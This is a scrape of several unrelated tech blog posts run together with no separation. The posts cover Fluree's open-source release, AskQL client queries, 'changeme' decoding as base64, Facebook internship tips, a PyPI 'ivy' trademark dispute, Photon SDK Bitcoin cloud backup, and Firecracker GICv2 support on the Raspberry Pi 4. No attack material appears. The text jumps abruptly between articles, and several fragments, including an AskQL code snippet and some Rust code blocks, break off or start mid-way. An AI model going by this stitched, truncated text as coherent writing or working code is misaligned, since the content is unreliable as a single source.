<p><em>Fluree is an Open-Source Semantic Graph Database that guarantees data integrity, provides traceability into data provenance, facilitates secure data collaboration, and powers connected data insights. Fluree organizes blockchain-secured data in an append-only, immutable ledger. Fluree exposes the ledger data in industry-standard RDF as a semantic graph database. Fluree can run on any machine, and its “edge” query servers can be scaled linearly to meet any level of enterprise demand. Fluree can even run as an in-memory database alongside your code, thanks to our </em><a href="https://flur.ee/javascript-library/"><em>Javascript library and React Frontend capabilities</em></a><em>.</em></p><p><em>Read more about fluree in our documentation </em></p><p><a href="http://docs.flur.ee/"><em>here</em></a><em>.</em></p>

<hr>



<p><br>On the heels of concluding our<a href="https://www.crn.com/news/applications-os/blockchain-startup-fluree-completes-seed-funding-round"> Seed Round</a> fundraise, the Fluree team is now focused on growing an open-source community of technologists passionate about the future of secure, democratic data management.</p>



<div><p>Fluree co-founder Brian Platz and Flip Filipowski have always planned to build the Fluree platform alongside an open-source community. The two established Fluree as a <a href="https://medium.com/fluree/why-fluree-is-a-pbc-public-benefit-corporation-50ab90ca081b">Public Benefit Corporation</a> to use the power of open, trusted data management to solve large-scale problems in our enterprises and society. Many of Fluree’s key use cases today —&nbsp; including Verifiable Credentials, Decentralized Identifiers, Master Data Management, Open Data platforms, and integrations with Public Blockchains — will benefit from an open-source community behind the technology and a rejection of vendor-locked proprietary formatting.&nbsp;</p></div>



<h2><strong>Why Open Source?</strong></h2>



<p>Trust and Accessibility.&nbsp;</p>



<p><em><strong>Trust</strong></em> – Data is becoming an important, dynamic asset for every organization. If enterprises are going to entrust a platform to securely manage this critical asset, it should be open-source and standards-based. Data is too valuable to be locked up in a proprietary format; held hostage by a single private vendor. By open-sourcing Fluree and leveraging W3C standards, you can have confidence that your data is future-proof and portable.</p>



<div><p><em><strong>Accessibility</strong></em> – Fluree is excited to provide its technology to anyone involved in the future of our internet. We are firmly committed to the idea that everyone should have equitable access to this cutting-edge technology.&nbsp;</p></div>



<h2><strong>Why Now?</strong></h2>



<p>Fluree <a href="https://medium.com/fluree/flureedb-is-production-ready-and-live-86bce82665dc">shipped</a> its first production-ready offering in 2018. Over the last two years, we assembled a team of skilled engineers to build out the platform with key <a href="http://flur.ee/features">features</a> and <a href="https://github.com/fluree">open-source libraries</a>, drawing from feedback in our growing developer <a href="https://launchpass.com/flureedb">community</a>.&nbsp;</p>



<div><p>Today, we feel confident in releasing Fluree Version 1.0 to the world — under Open Source —&nbsp; so that we can move our technology forward, together with our community.&nbsp;</p></div>



<h2><strong>What is the difference between the </strong><a href="https://flur.ee/getstarted/"><strong>Open-Source Community Edition</strong></a><strong> and the </strong><a href="https://flur.ee/contact/"><strong>Fluree Enterprise License</strong></a><strong>?&nbsp;</strong></h2>



<p><br>Not much from a technical standpoint. Let us explain:&nbsp;</p>



<p>All of Fluree’s features will be available for general use in our Open-Source version. We figured it wouldn’t make sense to restrict bells and whistles for members of our community that are investing the time to learn and build on our platform.&nbsp;</p>



<p><em>Examples of folks that would build on Fluree’s Open Source Community Edition:</em></p>



<ul><li>You are a university professor or student</li><li>You are a startup building an innovative SaaS or dApp</li><li>You are a developer at an enterprise testing Fluree in a proof of concept phase</li></ul>



<p><em>When you might make the switch to Fluree’s License-Supported Model:</em></p>



<ul><li>You are looking for 24/7 Commerical Support for setup and maintenance </li><li>You are deploying Fluree in a critical production environment that requires Fluree’s “officially-approved” license </li></ul>



<p>Fluree also intends to build out a suite of enterprise solutions around the core product, including tools to manage a Fluree data network and associated dashboards.&nbsp;</p>



<p><strong><em>A Third Option: Fluree’s Commercial Cloud</em></strong></p>



<p>Would you like to build, test, deploy, and run Fluree without provisioning your own servers? <a href="https://flur.ee/contact/">Get in touch with sales</a> to chat about our Database as a Service cloud environment.</p>

				Introduction to Data-Centricity			</a>

  fetch('https://api.covid19india.org/data.json')['cases_time_series']
  :map(fun(dataSet) {
                         return {

For instance – <code>statewise</code> also includes the <code>lastupdatedtime</code> property.</p><p>The GraphQL server does not expose this to the client. In order to expose this to the client, the GraphQL server needs to be redeployed with an updated schema.</p><p>Not so for AskQL. As we saw in <strong>Code snippet #3</strong>, you can send the mapping instruction via the <strong>AskScript</strong> query, directly from the client.</p><p>This means, the client team can move ahead without waiting for a server redeployment.</p><h3>Access to new resources</h3><p>The last use case was accessing data that was hidden by the resource/resolver.</p><p>Another use case is a situation in which the remote API was upgraded, or a new microservice was raised with information you need in order to farther enrich your data.</p><p>In the GraphQL server, this would again require the backend team to redeploy a new version of the server.</p><p>In AskQL, it is as easy as writing a new script.</p><p>In our example, the JSON fetched was showing data by states in India.  A new microservice was created that handles the data by districts (https://api.covid19india.org/state_district_wise.json).</p><p>Instead of creating a new resolver in the backend, the client side can just do the following:</p><pre><code>ask {
  const statewiseData = statewise();
  const districtData = fetch('https://api.covid19india.org/state_district_wise.json');
  statewiseData:map(fun(stateData) {
    {
      stateData,
      districtsData: districtData[stateData['state']]
    }
  });
}</code></pre><p><strong>Code Snippet #6</strong>: The statewise query enriched with district data in AskQL.</p><p>In <strong>Code snippet #6</strong> we get the states data array, and enrich it with the district data fetched from the new server. As easy as that.</p><p>You can check the <a rel="noreferrer noopener" href="https://github.com/YonatanKra/askql-demo/tree/covid-19" target="_blank">covid-19 branch</a> in the <a rel="noreferrer noopener" href="https://github.com/YonatanKra/askql-demo" target="_blank">askql-demo repository</a> for the full example.</p><h2>Why no just query from the client?</h2><p>That’s a good question, and there are various reasons for that. One reason that comes into mind – especially in commercial applications – is security.</p><p>The AskQL server will be an internet facing server.  It might be that it has access to non-internet facing servers inside an AWS VPC (or other cloud vendors equivalents).</p><p>So the AskQL server is mainly a security gateway for the client to be able to fetch data that is not internet facing and thus is not available directly.</p><p>Performance-wise, servers might have an optimised access to some resources. The fetch request might actually be much faster via the AskQL proxy rather …</p></div></div>

        <p><a href="https://en.wikipedia.org/wiki/Base64">Base64-encoding</a> is ubiquitous in our
modern world. Many programs communicate in base64-encoded messages, since these
have nice properties: They consist of a very limited subset of ASCII characters,
and can thus be displayed as text. E-Mails for example are commonly encoded in
base64 in transfer, which can be seen in the <code>Content-Transfer-Encoding</code> header.</p>

<p>Where I volunteer we have a tradition of putting <code>changeme</code> as a placeholder for
many template variables indicating that they should be overwritten later. Thus,
if we later still see <code>changeme</code> anywhere we know that somewhere somebody must
have forgotten to specify a variable<sup id="fnref:1"><a href="#fn:1">1</a></sup>.</p>

<p>Sometimes these template variables should correspond to base64-encoded content,
i.e. the base64-decoding of said variable should produce meaningful content. But
what happens if somebody forgets to define said variable, and it is substituted
with<code>changeme</code> instead? I always thought that it would fail to
decode the string since the probability that <code>changeme</code> is actually valid base64
encoding must be very low. But lo and behold, this is not the case:</p>

<pre><code>% echo changeme | base64 -d
r�[1m
</code></pre>

<p>Running <code>hexdump</code> on the output we can identify the characters:</p>

<pre><code>% echo changeme | base64 -d | hexdump -C
00000000  72 16 a7 81 e9 9e      |r.....|
00000006
</code></pre>

<p>Mostly nonsense, but the second byte is interesting: It is an ASCII control
character <sup id="fnref:2"><a href="#fn:2">2</a></sup>, meaning trips up all sorts of programs which expect to read
printable ASCII characters, such as JSON deserializers.</p>

<p>This bug actually occurred when I was migrating some applications between
different Kubernetes clusters: In the old cluster the application ran without
problems, but I forgot to specify some variable in the new cluster, and it lead
to Go complaining about non-ASCII characters in a JSON string.</p>

<p>I guess the moral of the story is: If you use dummy values be sure that they
cannot be misinterpreted.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p><h3>October 24, 2020</h3><h3>11 min read</h3></p><hr><p>The COVID pandemic has caused a dramatic economic downturn, and although tech firms are doing well, they’ve <strong>drastically reduced</strong> hiring for new grads.</p><p>So the question is, how as a college student do you land a job at these tech firms — by nailing your internship and getting that return offer!</p><p>This summer, I was interning at Facebook for the second time, and I believe that the feedback I’d received first time round really gave me the edge in securing that return offer with a high rating.</p><p>In my first internship at Facebook, I worked pretty steadily towards my internship project, and completed the project by the final review, and rolled it out for employee dogfooding. I didn’t have time to ship it to production by the end of the internship, so it lay in dogfooding for a year:</p><p>During my second internship at Facebook, I completed my assigned internship project in <strong>4 and a half weeks</strong>, and completed two other projects during the internship, the last of which I was given full rein to scope out myself.</p><p>I was literally <strong>3x more productive</strong> than during my first internship at Facebook!</p><p>The eagle-eyed amongst you will notice I shipped my second internship’s project <strong>before</strong> my first one!</p><h2 id="how-do-you-stay-productive-just-keep-swimming"><a href="#how-do-you-stay-productive-just-keep-swimming" aria-label="how do you stay productive just keep swimming permalink"></a>How do you stay productive? Just keep swimming!</h2><p>The single biggest factor to all of this is that I didn’t get <strong>stuck</strong> on a task for a long time. Usually the biggest drain of our time is just being stuck and not knowing what to do; the actual act of programming is comparatively short.</p><p>So how do you <strong>unblock</strong> yourself?</p><h3 id="1-ask-a-lot-of-questions"><a href="#1-ask-a-lot-of-questions" aria-label="1 ask a lot of questions permalink"></a>1. Ask a LOT of Questions!</h3><p>This is the #1 hack to being productive in your internship and something I didn’t do nearly enough first time round at FB.</p><p>It might seem counter-intuitive - surely asking a lot of questions means you’re a burden to your manager and wasting other people’s time? And that you’re not independent enough? Well, so long as you spend a bit of time searching internal wikis / internet beforehand and clearly explain what specifically you’re struggling with, the other full-timers will be glad to help!</p><p>My first intern manager explained it to me by discussing <em>team hours</em> - if I spend 2 hours stuck on something, that’s 2 team hours spent on that task, compared to only 10 team minutes if I ask someone else.</p><p>Definitely bias towards asking questions when ramping up - the more questions you ask, the quicker you’ll ramp up and the quicker you’ll start shipping code and making an <em>impact</em>. And that <em>impact</em> far outweighs the questions you asked at the start of the internship - your productivity is like an exponential curve!</p><h3 id="2-take-breaks-dont-work-yourself-into-the-ground"><a href="#2-take-breaks-dont-work-yourself-into-the-ground" aria-label="2 take breaks dont work yourself into the ground permalink"></a>2. Take Breaks. Don’t work yourself into the ground.</h3><p>This might seem obvious, but it’s still worth reiterating. Social media often promotes an unhealthy “superhuman” culture, which idolises people who work 100 hour+ weeks. Setting boundaries when working remotely is really important - I personally used the 10am daily stand-up meeting and my dinner to define my work boundaries (10am to 6:30pm).</p><p>Most tech companies care more about <strong>results</strong> than <strong>time put in</strong>, and actually some managers will advise <em>against</em> promotions / return offers if they think the amount you’re working is unsustainable (<em>especially</em> important if you’re super keen!).</p><h3 id="3-task-oriented-learning"><a href="#3-task-oriented-learning" aria-label="3 task oriented learning permalink"></a>3. Task-Oriented Learning</h3><p>It’s all too easy to get <em>paralysed</em> by a lack of knowledge, especially if you’re in a completely new tech stack. The mantra I have to get myself moving is to learn on a <strong>need-to-know basis</strong>: <em>just enough</em> to finish my task, not necessarily to understand <em>all</em> the details.</p><p>One way I learn “just enough” is to <em>learn by example</em> from existing code in the codebase. Not sure how <code>someComplicatedFunction</code> is meant to be used? Search for all the <code>someComplicatedFunction</code> function call sites in the codebase and go through each call site in turn.</p><p>I like to think of this as an <em>iterative deepening</em> approach to learning - you can always go back and learn it more in depth, but breaking off as small a chunk as possible helps you get going and…</p><div><p>Often what you’re evaluated on as an intern is your assigned project. So whilst learning and exploring beyond your team is something I wholeheartedly endorse, it should not come at the expense of your project.</p><p>Do a good job on your main project first, <strong>then</strong> you’ll be free to try new things without the pressure of the project deadlines!</p></div><h3 id="4-get-feedback-regularly"><a href="#4-get-feedback-regularly" aria-label="4 get feedback regularly permalink"></a>4. Get Feedback Regularly!</h3><p>The tighter your feedback loop, the quicker you’ll be able to correct course. Remember, getting feedback early saves <em>team hours</em>! It also improves the odds of you getting a return offer - if you have a performance review 5 weeks in, but you ask your manager for feedback 2 weeks in, that gives you 3 weeks until the review to work on the areas that need improvement!</p><p>Ways you can do this:</p><ul><li>Split code into <strong>small commits</strong> - these are much easier to review, and you can get feedback for one commit whilst you are working on later commits.</li><li>Submit <strong>work-in-progress</strong> versions of your code if you’re stuck - having code to look at makes it much easier for your teammates to help you out.</li><li>Write design docs / plans of action. Writing down a plan helps clarify parts of the task you’re unsure of, and for others to clear things up.</li></ul><h3 id="5-work-on-tasks-in-parallel"><a href="#5-work-on-tasks-in-parallel" aria-label="5 work on tasks in parallel permalink"></a>5. Work on Tasks in Parallel</h3><p>You see that internship project plan with clearly laid out milestones? It’s a lot more flexible than you think.</p><p>Plan out your project in terms of <strong>dependencies</strong> and work on a later milestone if you’re blocked on the current milestone.</p><p>E.g. if you’re waiting on the designs for your frontend UI milestone, start work on the backend milestone.</p><p>Better yet, ping the designer early and proactively arrange meetings to provide them technical feedback. If you can <em>unblock</em> them, then it will speed up your project.</p><h2 id="quality-of-work"><a href="#quality-of-work" aria-label="quality of work permalink"></a>Quality of Work</h2><p>There’s no point churning out code if it requires significant code review, or worse, needs to be rewritten during / after your internship. Remember the whole <em>team hours</em> we mentioned - if it takes you an hour to write some code, but then 3 hours of back-and-forth review and revisions, that’s much worse than spending 2 hours writing the same code, but getting it signed off after 15 minutes of review.</p><h3 id="6-feel-free-to-make-mistakes---just-dont-do-it-twice"><a href="#6-feel-free-to-make-mistakes---just-dont-do-it-twice" aria-label="6 feel free to make mistakes   just dont do it twice permalink"></a>6. Feel free to make mistakes - just don’t do it twice</h3><p>As an intern, you’re not expected to be able to churn out line-perfect code from day one - the most important thing is to <em>show improvement</em>.</p><p>As we said earlier, the quickest way to ramp-up is to get feedback. It’s much better to push out code even if you’re not sure it’s the best way of doing things, than to spend time stuck. So feel free to make mistakes - you’re an intern so you’re not going to be judged too harshly! Just note down the kinds of things flagged at code review and keep a checklist to go over the next time you submit for review.</p><p>The general trend the managers are looking for is that you don’t repeat the same kinds of mistakes (you respond to feedback) and that the amount of feedback / revision needed decreases over time.</p><h3 id="7-dont-just-hack-together-code-to-get-it-to-work"><a href="#7-dont-just-hack-together-code-to-get-it-to-work" aria-label="7 dont just hack together code to get it to work permalink"></a>7. Don’t just hack together code to get it to work!</h3><p>Hacking around seems good for exploratory solutions, but you’re incurring <strong>technical debt</strong>, which is especially costly for large features. See, whilst you speed up the first 80% of development (as you get something working quick), the last 20% of polishing and paying back the debt is what really slows you down. I encountered this a lot in my first internship where I’d think I was blasting through a task until I hit the polishing wall…</p><p>More crucially, hacking and copy-pasting code also makes you a little myopic, as all you’re focused about is <strong>getting the code to work</strong>, when instead you should…</p><h3 id="8-plan-for-future-use"><a href="#8-plan-for-future-use" aria-label="8 plan for future use permalink"></a>8. Plan for future use</h3><p>Codebases evolve. The code you check-in now will be used by someone else (and likely yourself!) so it is worth thinking about the manageability of the code - how much code will need to be changed for someone to extend your code to cover another use case? (This is dubbed the <strong>blast radius</strong> of the code).</p><p>Think about <strong>why</strong> you’re doing the task, not just <strong>what</strong> the task is. This will help you figure out how your code might be used in the future.</p><h3 id="9-checked-in-code--perfect-code"><a href="#9-checked-in-code--perfect-code" aria-label="9 checked in code  perfect code permalink"></a>9. Checked-in code != perfect code</h3><p>Just because it got accepted for code review in the past, doesn’t mean it’s good code! Best practices change over time, as people discover better design patterns (think React hooks!). It’s also easy to forget that the person who wrote the code is also human, and might have cut corners to meet a deadline. Equally, reviewers may not catch all bugs!</p><p>This leads nicely onto the next point:</p><h3 id="10-dont-take-things-for-granted"><a href="#10-dont-take-things-for-granted" aria-label="10 dont take things for granted permalink"></a>10. Don’t take things for granted</h3><p>It’s easy to get trapped in a mindset of just ticking off tasks set in your internship, but remember you’re still a valuable member of the team, so don’t be afraid to contribute further:</p><p>Contribute to the wiki - you’ve got a fresh perspective having just ramped up, so you’ll know which bits of the codebase you found especially hard to understand. Fix bugs, write tests that catch them.
File tasks about parts of the codebase you think can be improved. Refactor the codebase so it is in a better state after you left it.</p><p>All these things demonstrate <strong>initiative</strong> and will really distinguish you from other interns.</p><div><h3>Level up your software engineering skills!</h3><p>Want to find out more savvy tips about software engineering and more? Subscribe and I'll send them right to your inbox, so you don't miss out!</p></div><h3 id="11-read-and-review-other-code"><a href="#11-read-and-review-other-code" aria-label="11 read and review other code permalink"></a>11. Read and review other code</h3><p>Reading other team members’ code gives you a broader picture of what your team is working on and is also a good way of learning best practices.</p><p>Reviewing code feels daunting and the power dynamics seem wrong - how can I as an intern know how to write better code than a full-timer? The full-timers are human too, and a fresh pair of eyes on the code can pick up errors they might not have spotted. This way you’re also contributing to improving the code quality through your feedback.</p><p>Not sure how to start? Look at how other team members review code. One trick I used was to review a coworker’s commit, and afterwards look at what else my manager spotted when reviewing that commit. Like with code reviews on my own code, I kept a checklist of the kinds of …</p></article></div>

I found an odd email in my inbox yesterday from a company claiming ownership of a Python package, <a href="https://pypi.org/project/ivy/">Ivy</a>, that I registered on the Python Package Index back in August 2016, more than four years ago. The company is claiming ownership of the package on the basis of a <a href="https://trademarks.ipo.gov.uk/ipo-tmcase/page/Results/1/UK00003521605">UK trademark</a> on the word "ivy" filed in August 2020.
</p>
<p>
Here's the full text of the email:
</p>
<div>
<p>
Dear Mr. Mulholland,
</p>
<p>
We are genuinely sorry to be the bearers of bad news, but we are writing
after following the <a href="https://www.python.org/dev/peps/pep-0541/#how-to-request-a-name-transfer">advice</a> on
the PyPI website. We would kindly like to request that the "ivy" package name be released from PyPI, on the grounds that it violates our <a href="https://trademarks.ipo.gov.uk/ipo-tmcase/page/Results/1/UK00003521605">trademark</a>.
PyPI lists <a href="https://www.python.org/dev/peps/pep-0541/#invalid-projects">trademark violation</a> as grounds to invalidate a project on PyPI, with subsequent removal. If you would be more comfortable waiting for official involvement of PyPI before releasing the name, then we will gladly <a href="https://www.python.org/dev/peps/pep-0541/#how-to-request-a-name-transfer">open a new issue</a> with PyPI.
</p>
<p>
Please let us know if you have any questions regarding this request.
</p>
<p>
Kind Regards,<br>
The Ivy Team

I have no idea what this company does, they didn't link to their website, but they probably sell yoga mats judging from the stretchiness of this stretch.

Name Shortages and Namespacing
</h3>
<p>
Unfortunately the Python Package Index uses a single flat namespace for all packages so the name famine is a real and growing problem. I've been disappointed all too many times myself to find that a name I wanted to use was occupied by an abandoned project that hadn't been touched in years. (This isn't the case for <a href="https://github.com/dmulholl/ivy">Ivy</a> which is being actively developed.)
</p>
<p>
The problem must be getting serious as the Package Index's maintainers have introduced a set of formal guidelines and processes (<a href="https://www.python.org/dev/peps/pep-0541/">PEP 541</a>) for arbitrating disputes over package names — I certainly don't envy them the task.
I think the long-term solution instead is to introduce namespacing by username so packages like <code>dmulholl/ivy</code> and <code>yogamasters/ivy</code> can happily coexist.
</p>
<p>
I've actually been approached several times over the years by people wanting control over the <code>ivy</code> package. Usually they offer to buy it from me — this is the first time I've been threatened with a trademark. It'll be interesting to see how the Package Index maintainers handle the dispute.

 	<div><p>Tankred loves working in open source and focuses on Security and UX. After working on email encryption (OpenPGP), he joined Lightning Labs as lead application developer. Since then he’s been able to work full time on Bitcoin key management in the context of a Square Crypto grant.</p><h2>The risks of Bitcoin custody for end users</h2><p>Bitcoin is an asset that is difficult to store safely. If Bitcoin is to reach mass adoption the majority of users will likely not be very technically savvy. With that comes systemic risk that the community needs to address and find proper tools for. As of today users have several choices when it comes to custody. All come with a certain set of risks and tradeoffs.</p><h3>Keeping coins on the exchange</h3><p>Many users, especially newcomers keep their coins on the exchange. <a href="https://thenextweb.com/hardfork/2019/12/02/satoshi-nakaboto-coinbase-users-hold-nearly-1-million-bitcoin-in-their-wallets/">Coinbase currently holds around 1 million BTC</a> on behalf of its users. These risks have been addressed many times elsewhere. So I won’t go into them at length here. But among the biggest threats are the risk of the exchange getting hacked or becoming insolvent. Another big one is the user’s account getting hacked e.g. through a social engineering attack or a SIM swap attack. While keeping your coins on the exchange gives users a similar user experience as with a bank, this unfortunately does not come with the same security guarantees such as deposit insurance.</p><h3>Manage a seed</h3><p>The second option users have is to store their coins in their own wallet and manage a 24 word seed phrase via a paper backup. While this is usually a good place to start, once users start putting life changing amounts of value behind that seed phrase, they have to think about things like redundancy and security of their paper backup via a passphrase. Anyone who has helped to onboard new bitcoiners knows how difficult that conversation can be. In my own experience most people can write down a seed phrase and store their backup without much of a problem. Talking to them about redundancy and a passphrase usually leads to the conversation ending very quickly. Either they dismiss these risks or just decide to keep their coins on the exchange.</p><h3>Seedless multisig</h3><p>There are of course seedless multi-sig solutions in the market like the Casa App. But these have the downside of being closed source and often times expensive. Paying a subscription fee which is a substantial part of a user’s holdings isn’t an option for many newcomers.</p><h2>From PGP to Signal: encrypted messaging as an example</h2><p>Having worked in the email encryption space, I know how hard it is to convince users to adopt better security and privacy practices. I co-founded Whiteout Mail in 2013 to make PGP more accessible to mainstream users. The mistake was thinking that we could change the users’ behavior. Today the strong set of PGP keys on SKS public key servers is around 50k (basically nothing in terms of internet scale). Many in the security industry have since given up on PGP and email encryption in general.</p><p>Enter Signal. The Signal messaging protocol showed us how it needs to be done. In contrast to PGP the Signal protocol did not require users to change their behavior. Public keys were automatically fetched from a key server which verified the user's phone number. This reduction in security by trusting a central key server was criticized by many in the IT security industry. But these critics underestimated the potential upside in terms of usability and adoption. Due to its ease of use, the Signal protocol could be added to existing messaging applications such as WhatsApp with a simple software update. This meant that over 3 billion WhatsApp users can use end-to-end encrypted messaging without needing to understand the technical details.</p><p>I believe that Bitcoin needs to go through a similar evolution to achieve higher market adoption for self custody.</p><h2>Security Nihilism</h2><p>Having these types of discussion with hardcore Bitcoiners often reminds me of a quote by Alex Stamos, former CSO at Yahoo and Facebook.</p><p><i>“Security Nihilism is a set of beliefs that includes the assumptions that all attackers are perfect, that everybody faces the worst possible threat scenario, or that any compromise to make a security feature more widespread should be considered a bug.”</i></p><ul><li>Alex Stamos, Black Hat 2017 Keynote</li></ul><p>I believe as a community we need to overcome these restricting ways of thinking to enable creativity and give ourselves permission to experiment.</p><h2>We need to ask better questions</h2><p>A good start is to ask better questions. Looking at the current landscape of wallets and products, are we really addressing user needs? In order to overcome the gap between exchanges and non-custodial wallets the following questions come to mind:</p><ol><li>Can we make it easier for newcomers to secure small amounts?</li><li>Can we engineer better UX and better security than custodial solutions?</li><li>Can we “upsell” additional security over time as user funds grow?</li></ol><p>My attempt at addressing these questions is something I call the Photon SDK.</p><h2>Photon SDK: seedless wallet toolbox</h2><p>Photon’s primary goal is to explore UX and security tradeoffs, specifically for mobile wallets. It’s a set of fully open source components that are currently written in JavaScript for React Native applications. I chose React Native since it allows cheap and easy prototyping during the exploration phase. As these concepts solidify and there is demand by wallets, native implementations for iOS and Android are the next step. The SDK currently consists of these three components:</p><ol><li><a href="https://github.com/photon-sdk/photon-keyserver">photon-keyserver</a>: stores high entropy encryption keys and provides server side security such as rate limited PIN authentication</li><li><a href="https://github.com/photon-sdk/photon-lib">photon-lib</a>: a React Native client module that can be integrated into any wallet application</li><li><a href="https://github.com/photon-sdk/photon-app">photon-app</a>: a demo React Native application that documents how these components work together in a final product</li></ol><h2>2-of-2 seedless cloud backup</h2><p>Photon’s encrypted cloud backup is very simple and provides a 2-of-2 security model, as described below.</p><p><img alt="photon setup" height="879" src="https://advbitcoin.s3.amazonaws.com/images/Screenshot_2020-09-14_at_12.38.24.width-800.png" width="800"></p><p>Firstly the wallet seed is encrypted client side and then stored on the user’s iCloud or Google Drive (depending on if they use iOS or Android). Then the encryption key is stored on the photon-keyserver which is protected with rate-limited PIN authentication. The idea is that an attacker would need access to the user’s Apple or Google account to access their cloud storage, as well as know the PIN required to download the encryption key.</p><h2>Key server Authentication</h2><p>The key server stores the encryption key required to decrypt the seed from the user’s cloud storage. As such it is important to secure access using a robust authentication scheme. Photon does not require users to sign up with their email address or to create a separate account. Rather, a random key ID that uniquely identifies the user is generated on the key server and stored in the user’s iCloud or Google Drive. This key ID as well as a user chosen PIN is used to authenticate to the key server. Furthermore server-side rate limiting is enforced to increase the security of the user chosen PIN. This allows the seed to be encrypted with a high entropy random encryption key while requiring the user to only remember a short PIN. Currently a time lock of 7 days is enforced on encryption key download after 10 failed authentication attempts. This results in about 19 years to brute force a simple four digit PIN.</p><h2>Time delayed PIN recovery</h2><p>As users store considerable value in their wallets, they might desire to set a recovery email address or phone in case they forget their PIN. Since I wanted to retain the fact that Bitcoin does not have a login this feature is purely optional. The SDK supports both email addresses as well as phone numbers for PIN recovery. Users verify ownership of their accounts via email or sms respectively. Upon PIN reset a 30 day time lock is enforced on the key server to mitigate SIM swap attacks. The idea is that an attacker would not have enough time to steal the user’s funds as users would notice loss of their phone number and/or email account within that time. After the time delay users can set a new PIN and recover their funds.</p><h2>Photon SDK roadmap</h2><p>While time locked PIN based authentication might provide a sufficient layer of security for smaller amounts of value, I’d like to enable additional layers of security as the user’s funds grow. This approach is inline with the “upselling” strategy proposed earlier.</p><h3>Backup integrity checks a.k.a. “Health Checks”</h3><p>This feature will primarily be implemented in the demo wallet application and represent a UX pattern that the SDK will promote as a best practice. Namely to notify the user every 90 days day to practice key recovery. Basically the user is asked for their PIN and the encrypted seed on the user's cloud will be checked for integrity and compared with the wallet’s installed key. If the user has forgotten their PIN or the encrypted key in their cloud storage is corrupt the app can easily recover by rotating keys and creating a new backup.</p><h3>2FA for photon-keyserver (Google Auth &amp; Fido U2F)</h3><p>As the user’s funds grow a simple PIN based authentication might not be enough security for many users. In this case the wallet should suggest an additional 2FA (2 factor authentication) method such as Google Authenticator or FIDO U2F compatible hardware keys. Upon key recovery the wallet app will ask users for their PIN as well as one 2FA method.</p><h3>Seedless multisig</h3><p>Another feature in the roadmap is open source seedless multisig with a 2-of-3 or a 3-of-5 setup. This will likely be demanded by more advanced users with higher values to secure. There are many directions this feature could go but file based PSBT and XPUB sharing such as in ColdCard wallets would enable a mobile experience that does not require a desktop computer.</p><h3>Native iOS &amp; Android libraries</h3><p>As interest in the Bitcoin ecosystem for Photon grows, wallets will likely need native library implementations via Swift and Java. Please reach out if you are experienced in native mobile development and would like to contribute in this regard!</p><p>Demo app on Testflight</p><p>I’m …</p></div></article></div>

October 24, 2020 | https://blog.cloudkernels.net/posts/firecracker-rpi4/ | <a href="https://web.archive.org/web/*/https://blog.cloudkernels.net/posts/firecracker-rpi4/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      

<p>Since we got our hands on the new Raspberry Pi 4, we started exploring how
various virtualization technologies behave on the board. First thing we tried is how to run <a href="https://cloudkernels.github.io/posts/rpi4-64bit-virt/">Nabla</a> on it and how it compares to native KVM.</p>

<p>Next thing we wanted to try is <a href="https://github.com/firecracker-microvm/firecracker">firecracker</a>, the notorious micro-VMM that
Amazon Lambda &amp; Fargate run on. To our disappointment, firecracker was not
<a href="https://github.com/firecracker-microvm/firecracker/issues/1196">yet</a> running on RPi4. So we started looking into coding in the necessary
changes :)</p>

<p>After a bit of investigation, we figured out that the key missing piece is
support for the GICv2 ARM interrupt controller. In fact, firecracker only
supports GIC version 3 since it was open-sourced, but not version 2, which is
the version appearing in the Raspberry Pi series, as well as in other popular
boards, like the Hikey 970 we got our hands on, or Khadas VIM3. A bit more
digging into the internals of firecracker and the Linux kernel, helped us
work out the details and open a <a href="https://github.com/firecracker-microvm/firecracker/pull/1235">pull-request</a> which adds support for the
missing parts.</p>

<h4 id="changes-in-firecracker">Changes in Firecracker</h4>

<p>The Generic Interrupt Controller (GIC) is the IP block in the ARM processors
that implements interrupt handling. The Linux kernel supports user- and
kernel-space emulation for GICv2 as well as GICv3 and v4. However, Firecracker
only handles the GICv3-related configuration of the virtual GIC (VGIC).
Similarly, setting up the FDT for the guest microVM from Firecracker only
handles GIC-v3 devices.</p>

<p>In terms of code organization, the GIC related code currently exposes a function
for setting up GICv3 performing the corresponding <code>ioctl</code> KVM commands. The
first part of our PR changes this by introducing a GIC Trait which defines the
common interface for all GIC implementations. Even though it is still under
discussion, what exactly will be in the Trait in its final form, it will be
something along the following lines:</p>
<div><pre><code data-lang="rs"><span>/// Trait for GIC devices.
</span><span></span><span>pub</span><span> </span><span>trait</span><span> </span>GICDevice<span> </span>{<span>
</span><span>    </span><span>/// Returns the GIC version of the device
</span><span></span><span>    </span><span>fn</span> <span>version</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>u32</span>;<span>
</span><span>
</span><span>    </span><span>/// Returns the file descriptor of the GIC device
</span><span></span><span>    </span><span>fn</span> <span>device_fd</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>&amp;</span><span>DeviceFd</span>;<span>
</span><span>
</span><span>    </span><span>/// Returns an array with GIC device properties
</span><span></span><span>    </span><span>fn</span> <span>device_properties</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>&amp;</span>[<span>u64</span>];<span>
</span><span></span>}<span>
</span></code></pre></div>
<p>With this in place, we can define objects per GIC version, which implement this
Trait, and still have the rest of the code deal with the <code>GICDevice</code> Trait,
which is transparent to the GIC version.</p>

<p>The implementations for each version, implement the Trait and a <code>new</code> function
which is used to create the new object:</p>
<div><pre><code data-lang="rs"><span>pub</span><span> </span><span>fn</span> <span>new</span>(vm: <span>&amp;</span><span>VmFd</span>,<span> </span>vcpu_count: <span>u64</span>)<span> </span>-&gt; <span>Result</span><span>&lt;</span><span>Box</span><span>&lt;</span>GICDevice<span>&gt;&gt;</span><span>
</span></code></pre></div>
<p>The differentiation between the two versions lays in the VGIC register
attributes that each device exposes. As a result, the work we need to do is essentially to <code>mmap</code> their addresses.</p>

<p>GICv2 relevant addresses include the <strong>distributor</strong> and <strong>cpu</strong> groups:</p>
<div><pre><code data-lang="rs"><span>/* Setting up the distributor attribute.

</span></code></pre></div>
<p>whereas the GICv3 includes the <strong>distributor</strong> and <strong>redistributor</strong> groups:</p>
<div><pre><code data-lang="rs"><span>/* Setting up the distributor attribute.

<p>Finally, for both versions of GIC we finalize the device initialization by
setting the number of supported interrupts and the <em>control_init</em> group.</p>

<p>Regarding the FDT creation, there are differences between v2 and v3 regarding
the interrupt controller <code>intc</code> node.</p>

<p>First, we need to define the GICv2 <code>compatible</code> property to be <code>arm,gic-400</code>,
